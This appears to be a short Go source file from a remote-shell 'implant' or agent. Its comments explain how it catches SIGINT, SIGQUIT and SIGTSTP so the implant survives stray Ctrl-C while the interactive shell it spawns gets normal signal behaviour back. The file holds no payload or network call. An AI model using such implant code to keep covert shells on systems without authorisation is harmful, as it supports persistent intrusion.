//go:build !windows

package main

// The implant is usually launched from something that ignores SIGINT (a shell
// job started with &, nohup, a service wrapper). Ignored dispositions are
// inherited across exec, so the interactive shell and everything it starts also
// ignore SIGINT: with a pty and job control in place, Ctrl-C still did nothing.
//
// Taking a handler here flips the disposition to "caught", and os/exec resets
// caught signals to SIG_DFL in the child, so ^C, ^\ and ^Z behave normally in
// the shell again. The implant itself stays immune to them.

import (
	"os"
	"os/signal"
	"syscall"
)

func resetInheritedSignals() {
	ch := make(chan os.Signal, 4)
	signal.Notify(ch, os.Interrupt, syscall.SIGQUIT, syscall.SIGTSTP)
	go func() {
		for range ch {
			// deliberately swallowed: the agent must not die on a stray ^C
		}
	}()
}
